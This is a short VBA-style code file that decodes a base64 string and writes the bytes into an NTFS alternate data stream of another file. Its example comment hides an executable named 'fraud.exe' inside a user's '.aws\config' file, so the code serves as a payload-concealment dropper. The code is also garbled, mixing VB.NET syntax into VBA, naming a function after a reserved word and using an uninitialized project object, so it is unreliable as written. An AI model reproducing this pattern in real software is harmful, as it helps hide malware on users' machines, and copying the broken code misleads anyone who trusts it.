Dim vbProj As VBIDE.VBProject
vbProj.References.AddFromFile "C:\Windows\System32\msxml6.dll"

' --------------------------------------------------------------------------------
' Method:    DecodeBase64
' Desc:      Decode a base64 string to a byte array
' Arguments: strData - Base64 string
' Returns:   Byte array
' Example: DecodeBase64("AA")
' --------------------------------------------------------------------------------
Private Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML As MSXML6.DOMDocument
    Dim objNode As MSXML6.IXMLDOMElement
   
    ' help from MSXML - see the msxml6 project reference above
    Set objXML = New MSXML6.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
   
    ' cleanup
    Set objNode = Nothing
    Set objXML = Nothing
End Function

' --------------------------------------------------------------------------------
' Method:    Write
' Desc:      Write a unicode encoded file to another file's alternate data stream
' Arguments: b64FileContent - Input unicode String representing the file
'            fileName - Absolute path to the file which ads should be written
'            ads - Alternate data stream name including file extension
' Returns:   The full path of the target file including the ads part
' Example: Write("...", "C:\Users\Bob\.aws\config", "fraud.exe")
' --------------------------------------------------------------------------------
Public Function Write(
  b64FileContent As String,
  fileName As String,
  ads As String,
) As String
  Dim baFileContent As Byte() = DecodeBase64(b64FileContent)
  Dim target As String = fileName  & ":" & ads  
  Dim iFile As Integer: iFile = FreeFile
  
  Open target For Binary Lock Read Write As #iFile
  Put #iFile, , baFileContent
  Close #iFile
  
  Write = target
End Function
